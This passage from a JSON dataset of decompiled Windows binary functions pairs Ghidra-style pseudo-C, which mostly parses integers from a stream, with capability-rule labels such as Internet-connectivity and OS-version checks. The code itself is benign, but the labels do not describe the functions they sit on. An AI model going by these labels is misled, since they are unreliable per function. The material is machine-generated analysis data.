fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140029e90(ppiStack144);\n                    cVar13 = *(iVar9 + 0x20);\n                    goto code_r0x00014004c066;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar13 = *(iVar9 + 0x20);\ncode_r0x00014004c066:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar13 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x00014004c093;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar16 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar16 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014004c093:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004c11b;\n                        }\n                        uVar5 = uVar16 == 0 || uVar15 == 0x10;\n                        if (uVar16 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x00014004c132;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x00014004c0f0;\ncode_r0x00014004c4e8:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x00014004c0f0;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x00014004c4e8;\ncode_r0x00014004c0f0:\n                        bVar23 = false;\n                    }\n                    bVar14 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar14) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar14;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x00014004c11b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004c530:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004c530;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar13 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004c11b:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x00014004c326;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar16 != 8) goto code_r0x00014004bfd8;\n        uVar15 = 0x10;\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004bffc;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x00014004c326:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x00014004c132:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar9 + 0x88);\n    uVar16 = 0xffffffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            uVar17 = 0;\ncode_r0x00014004c194:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004c3f2;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004c3db;\n            uVar18 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar16 < uVar17) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar7 = uVar17 * uStack136;\n                        uVar17 = uVar18 + uVar7;\n                        uStack131 = uStack131 | CARRY4(uVar18, uVar7);\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar10 = piStack104[3];\n                    if (piStack104[2] < uVar10) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar10 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar10 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x00014004c236;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x00014004c3f2;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x00014004c5a4:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004c3f2;\n                    uVar18 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004c194;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004c194;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x00014004c3f2;\n                cVar6 = -1;\ncode_r0x00014004c3db:\n                if (5 < cVar6 + 0x9fU) goto code_r0x00014004c5a4;\n                uVar18 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004c3f2;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x00014004c236:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004c246;\ncode_r0x00014004c405:\n        uVar20 = uVar2;\n        fcn.14007da40(aiStack80, iVar19);\n        cVar6 = fcn.1400b76a0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004c449;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x00014004c236;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x00014004c6b1;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar15),  iVar12 != 0))\n              ) {\n            uVar7 = iVar12 - (iVar9 + 0x72);\n            if (0xf < uVar7) {\n                uVar7 = uVar7 - 6;\n            }\n            uVar2 = uVar20;\n            if (uVar17 <= uVar16) {\n                uVar18 = uVar17 * uStack136;\n                uVar17 = uVar7 + uVar18;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | CARRY4(uVar7, uVar18);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar10 = piStack104[3];\n                if (piStack104[2] < uVar10) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar10 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar10 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x00014004c236;\n                uVar7 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x00014004c6b1:\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x00014004c236;\n                }\n                fcn.14007da40(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004c3f2:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004c405;\ncode_r0x00014004c246:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x00014004c449:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar17 = -uVar17;\n                    }\n                    *in_stack_00000038 = uVar17;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004c275;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004c275:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x14010fc90 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4419
    },
    "14004c93": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.14004c930(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int64_t *piVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char cVar11;\n    bool bVar12;\n    int32_t iVar13;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint8_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    bool bVar21;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t uStack160;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack130;\n    bool bStack129;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar7 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar14 = 8;\ncode_r0x00014004c998:\n        uVar4 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar4 == 0) {\ncode_r0x00014004c9bc:\n            ppiStack144 = &piStack104;\n            uVar6 = fcn.140029e90(ppiStack144);\n            cVar5 = uVar6;\n            bVar19 = *(iVar7 + 0x6e) == cVar5;\n            uStack136 = bVar19;\n            if ((bVar19) || (*(iVar7 + 0x6f) == cVar5)) {\n                cVar11 = *(iVar7 + 0x20);\n                if (((cVar11 != '\\0') && (*(iVar7 + 0x49) == cVar5)) || (*(iVar7 + 0x48) == cVar5))\n                goto code_r0x00014004ca26;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar4 = fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar4 == 0) {\n                    uVar6 = fcn.140029e90(ppiStack144);\n                    cVar11 = *(iVar7 + 0x20);\n                    goto code_r0x00014004ca26;\n                }\n                iVar15 = 0;\n                bVar19 = false;\n            }\n            else {\n                uStack136 = 0;\n                cVar11 = *(iVar7 + 0x20);\ncode_r0x00014004ca26:\n                iVar15 = 0;\n                bVar19 = false;\n                while (((piVar3 = piStack104,  cVar5 = uVar6,  cVar11 == '\\0' || (*(iVar7 + 0x49) != cVar5)) &&\n                       (*(iVar7 + 0x48) != cVar5))) {\n                    if (*(iVar7 + 0x72) == cVar5) {\n                        bVar19 = bVar19 ^ 1U | uVar14 == 10;\n                        if (!bVar19) goto code_r0x00014004ca53;\n                        bVar21 = uVar14 == 8;\n                        if (bVar21 || uVar16 == 0) {\n                            iVar15 = 0;\n                            uVar14 = 8;\n                            bVar19 = bVar21 || uVar16 == 0;\n                        }\n                        else {\n                            iVar15 = iVar15 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x00014004ca53:\n                        if ((*(iVar7 + 0x70) != cVar5) && (*(iVar7 + 0x71) != cVar5)) {\n                            uVar4 = 0;\n                            bVar19 = true;\n                            goto code_r0x00014004cadb;\n                        }\n                        uVar4 = uVar16 == 0 || uVar14 == 0x10;\n                        if (uVar16 != 0 && uVar14 != 0x10) {\n                            bVar19 = true;\n                            uStack160 = uVar14;\n                            goto code_r0x00014004caf2;\n                        }\n                        iVar15 = 0;\n                        uVar14 = 0x10;\n                        bVar19 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar8 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar8;\n                        if (uVar8 < piStack104[3]) goto code_r0x00014004cab0;\ncode_r0x00014004cec8:\n                        uStack96 = 0xffffffff;\n                        iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                        if (iVar13 != -1) goto code_r0x00014004cab0;\n                        piStack104 = NULL;\n                        bVar21 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar3[3] <= piVar3[2]) goto code_r0x00014004cec8;\ncode_r0x00014004cab0:\n                        bVar21 = false;\n                    }\n                    bVar12 = piStack120 != NULL && iStack112 == -1;\n                    bVar20 = iStack112 == -1;\n                    if (bVar12) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar13 = (**(*piStack120 + 0x48))(),  iVar13 != -1)) {\n                            bVar20 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar20 = bVar12;\n                        }\n                    }\n                    if (bVar20 == bVar21) {\n                        uVar4 = 1;\n                        goto code_r0x00014004cadb;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004cf10:\n                        uVar6 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar6 = *piStack104[2];\n                    }\n                    else {\n                        uVar6 = (**(*piStack104 + 0x48))();\n                        if (uVar6 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004cf10;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar11 = *(iVar7 + 0x20);\n                }\n                uVar4 = 0;\n            }\ncode_r0x00014004cadb:\n            uStack160 = uVar14;\n            if (uVar14 == 0x10) goto code_r0x00014004ccf6;\n        }\n        else {\n            uStack136 = 0;\n            uVar6 = 0;\n            iVar15 = 0;\n            bVar19 = false;\n            uStack160 = uVar14;\n        }\n    }\n    else {\n        uVar14 = 10;\n        if (uVar16 != 8) goto code_r0x00014004c998;\n        uVar14 = 0x10;\n        uVar4 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar4 == 0) goto code_r0x00014004c9bc;\n        uStack136 = 0;\n        uVar6 = 0;\n        iVar15 = 0;\n        bVar19 = false;\ncode_r0x00014004ccf6:\n        uStack160 = 0x10;\n        uVar14 = 0x16;\n    }\ncode_r0x00014004caf2:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar18 = *(iVar7 + 0x88);\n    uVar16 = uStack136 + 0x7fffffff;\n    if (uVar18 == 0) {\n        uStack130 = 0;\n        if (uVar4 == 0) {\n            cStack152 = uVar14;\n            uVar17 = 0;\ncode_r0x00014004cb5d:\n            cVar5 = uVar6;\n            uVar6 = cVar5;\n            if (uVar14 < 0xb) {\n                if ((cVar5 < '0') || (cStack152 + '0' <= cVar5)) goto code_r0x00014004cdc4;\n            }\n            else if (9 < cVar5 - 0x30U) goto code_r0x00014004cdac;\n            iVar13 = uVar6 - 0x30;\n            do {\n                while( true ) {\n                    piVar3 = piStack104;\n                    if (uVar16 / uStack160 < uVar17) {\n                        uStack130 = 1;\n                    }\n                    else {\n                        uStack130 = uStack130 | uVar16 - iVar13 < uVar17 * uStack160;\n                        uVar17 = uVar17 * uStack160 + iVar13;\n                        iVar15 = iVar15 + 1;\n                    }\n                    uVar8 = piStack104[3];\n                    if (piStack104[2] < uVar8) {\n                        uVar9 = piStack104[2] + 1;\n                        piStack104[2] = uVar9;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar9 = piVar3[2];\n                        uVar8 = piVar3[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar21 = false;\n                    if (uVar8 <= uVar9) {\n                        iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                        if (iVar13 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar21 = iVar13 == -1;\n                    }\n                    bVar20 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar13 = (**(*piStack120 + 0x48))();\n                        bVar20 = iVar13 == -1;\n                        if (bVar20) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar21 == bVar20) {\n                        uVar2 = uVar4;\n                        uVar18 = 1;\n                        goto code_r0x00014004cc05;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar14 < 0xb) goto code_r0x00014004cdc4;\n                    cVar5 = -1;\n                    uVar6 = 0xffffffff;\ncode_r0x00014004cf84:\n                    if (5 < cVar5 + 0xbfU) goto code_r0x00014004cdc4;\n                    iVar13 = uVar6 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar6 = *piStack104[2];\n                    goto code_r0x00014004cb5d;\n                }\n                uVar6 = (**(*piStack104 + 0x48))();\n                if (uVar6 != 0xffffffff) goto code_r0x00014004cb5d;\n                piStack104 = NULL;\n                if (uVar14 < 0xb) goto code_r0x00014004cdc4;\n                cVar5 = -1;\ncode_r0x00014004cdac:\n                if (5 < cVar5 + 0x9fU) goto code_r0x00014004cf84;\n                iVar13 = uVar6 - 0x57;\n                if (uVar6 == 0x56) goto code_r0x00014004cdc4;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar18 = uVar4;\ncode_r0x00014004cc05:\n        uVar4 = uVar2;\n        uVar2 = uVar18;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004cc15;\ncode_r0x00014004cdd7:\n        uVar18 = uVar2;\n        fcn.14007da40(aiStack80, iVar15);\n        cVar5 = fcn.1400b76a0(*(iVar7 + 0x10), *(iVar7 + 0x18), aiStack80);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar15 != 0) || (bVar19)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004ce1b;\n    }\n    else {\n        if (uVar4 != 0) {\n            uStack130 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar18 = uVar4;\n            goto code_r0x00014004cc05;\n        }\n        uVar2 = *(iVar7 + 0x20);\n        uStack130 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar7 + 0x49) == uVar6)) goto code_r0x00014004d097;\n        while ((*(iVar7 + 0x48) != uVar6 && (iVar10 = sub.msvcrt.dll_memchr(iVar7 + 0x72, uVar6, uVar14),  iVar10 != 0))\n              ) {\n            iVar13 = iVar10 - (iVar7 + 0x72);\n            if (0xf < iVar13) {\n                iVar13 = iVar13 + -6;\n            }\n            uVar2 = uVar18;\n            if (uVar17 <= uVar16 / uStack160) {\n                uVar6 = uVar17 * uStack160;\n                uVar17 = uVar6 + iVar13;\n                iVar15 = iVar15 + 1;\n                uVar2 = uStack130 | uVar16 - iVar13 < uVar6;\n            }\n            while( true ) {\n                uStack130 = uVar2;\n                piVar3 = piStack104;\n                uVar8 = piStack104[3];\n                if (piStack104[2] < uVar8) {\n                    uVar9 = piStack104[2] + 1;\n                    piStack104[2] = uVar9;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar9 = piVar3[2];\n                    uVar8 = piVar3[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack129 = false;\n                if (uVar8 <= uVar9) {\n                    iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                    if (iVar13 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack129 = iVar13 == -1;\n                }\n                bVar21 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar21)) && (bVar21 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar13 = (**(*piStack120 + 0x48))();\n                    bVar21 = iVar13 == -1;\n                    if (bVar21) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar4;\n                if (bStack129 == bVar21) goto code_r0x00014004cc05;\n                uVar6 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar7 + 0x20);\n                if ((uVar2 == 0) || (*(iVar7 + 0x49) != uVar6)) break;\ncode_r0x00014004d097:\n                if (iVar15 == 0) {\n                    uVar18 = 0;\n                    goto code_r0x00014004cc05;\n                }\n                fcn.14007da40(aiStack80, iVar15);\n                iVar15 = 0;\n                uVar2 = uStack130;\n            }\n        }\ncode_r0x00014004cdc4:\n        uVar18 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004cdd7;\ncode_r0x00014004cc15:\n        if ((bVar19) || (iVar15 != 0)) {\ncode_r0x00014004ce1b:\n            if (uVar4 == 0) {\n                if (uStack130 == 0) {\n                    uVar16 = -uVar17;\n                    if (uStack136 == '\\0') {\n                        uVar16 = uVar17;\n                    }\n                    *in_stack_00000038 = uVar16;\n                }\n                else {\n                    *in_stack_00000038 = uStack136 + 0x7fffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004cc44;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004cc44:\n    if (uVar18 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar15 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (iVar15 == 0) {\n        iVar15 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar15 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar15 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar15 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4433
    },
    "14004d31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14004d310(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    char cVar13;\n    bool bVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar15 = 8;\ncode_r0x00014004d378:\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004d39c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140029e90(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar13 = *(iVar9 + 0x20);\n                if (((cVar13 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x00014004d406;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140029e90(ppiStack144);\n                    cVar13 = *(iVar9 + 0x20);\n                    goto code_r0x00014004d406;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar13 = *(iVar9 + 0x20);\ncode_r0x00014004d406:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar13 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x00014004d433;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar16 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar16 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014004d433:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004d4bb;\n                        }\n                        uVar5 = uVar16 == 0 || uVar15 == 0x10;\n                        if (uVar16 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x00014004d4d2;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x00014004d490;\ncode_r0x00014004d888:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x00014004d490;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 